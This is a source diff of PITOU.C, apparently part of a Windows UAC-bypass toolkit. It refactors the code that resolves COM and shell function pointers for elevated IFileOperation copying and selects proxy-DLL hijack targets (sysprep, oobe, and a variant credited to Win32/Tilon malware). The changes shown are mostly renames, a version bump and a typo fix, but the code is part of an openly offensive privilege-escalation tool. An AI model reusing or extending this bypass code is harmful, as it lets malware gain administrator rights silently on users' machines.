@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     1.91
+*  VERSION:     2.00
 *
-*  DATE:        12 Oct 2015
+*  DATE:        16 Nov 2015
 *
 *  Leo Davidson work based AutoElevation and Pitou new variant.
 *
@@ -195,15 +195,15 @@ BOOL ucmCreateCallParameters(
 		elvpar->xIID_IShellItem = IID_IShellItem;
 		elvpar->xCLSID = CLSID_FileOperation;
 
-		elvpar->xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ldp.hOle32, "CoInitialize");
-		elvpar->xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ldp.hOle32, "CoCreateInstance");
-		elvpar->xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ldp.hOle32, "CoGetObject");
-		elvpar->xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ldp.hOle32, "CoUninitialize");
-		elvpar->xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(g_ldp.hShell32, "SHCreateItemFromParsingName");
-		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ldp.hShell32, "ShellExecuteExW");
-		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ldp.hKernel32, "WaitForSingleObject");
-		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ldp.hKernel32, "CloseHandle");
-		elvpar->xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ldp.hKernel32, "OutputDebugStringW");
+		elvpar->xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ctx.hOle32, "CoInitialize");
+		elvpar->xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ctx.hOle32, "CoCreateInstance");
+		elvpar->xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ctx.hOle32, "CoGetObject");
+		elvpar->xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ctx.hOle32, "CoUninitialize");
+		elvpar->xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(g_ctx.hShell32, "SHCreateItemFromParsingName");
+		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
+		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
+		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");
+		elvpar->xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ctx.hKernel32, "OutputDebugStringW");
 
 		bResult = TRUE;
 
@@ -222,12 +222,12 @@ BOOL ucmCreateCallParameters(
 * M1W7   - Original Leo Davidson concept.
 * M1W8   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
 * M1W7T  - Leo Davidson concept with different target dll, used by Win32/Tilon.
-* M1W10  - Windows 10 adapter M1W7.
+* M1W10  - Windows 10 adapted M1W7.
 * M1WALL - WinNT/Pitou derivative from Leo Davidson concept.
 *
 */
 BOOL ucmStandardAutoElevation(
-	DWORD dwType,
+	UACBYPASSMETHOD Method,
 	CONST PVOID ProxyDll,
 	DWORD ProxyDllSize
 	)
@@ -236,33 +236,33 @@ BOOL ucmStandardAutoElevation(
 	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
 	WCHAR		szBuffer[MAX_PATH + 1];
 
-	switch (dwType) {
+	switch (Method) {
 
-	case METHOD_SYSPREP1:
+	case UacMethodSysprep1:
 		lpSourceDll = M1W7_SOURCEDLL;
 		lpTargetDir = M1W7_TARGETDIR;
 		lpTargetProcess = M1W7_TARGETPROCESS;
 		break;
 
-	case METHOD_SYSPREP2:
+	case UacMethodSysprep2:
 		lpSourceDll = M1W8_SOURCEDLL;
 		lpTargetDir = M1W7_TARGETDIR;
 		lpTargetProcess = M1W7_TARGETPROCESS;
 		break;
 
-	case METHOD_SYSPREP3:
+	case UacMethodSysprep3:
 		lpSourceDll = M1W10_SOURCEDLL;
 		lpTargetDir = M1W7_TARGETDIR;
 		lpTargetProcess = M1W7_TARGETPROCESS;
 		break;
 
-	case METHOD_OOBE:
+	case UacMethodOobe:
 		lpSourceDll = M1WALL_SOURCEDLL;
 		lpTargetDir = M1WALL_TARGETDIR;
 		lpTargetProcess = M1WALL_TARGETPROCESS;
 		break;
 
-	case METHOD_TILON:
+	case UacMethodTilon:
 		lpSourceDll = M1W7T_SOURCEDLL;
 		lpTargetDir = M1W7_TARGETDIR;
 		lpTargetProcess = M1W7_TARGETPROCESS;
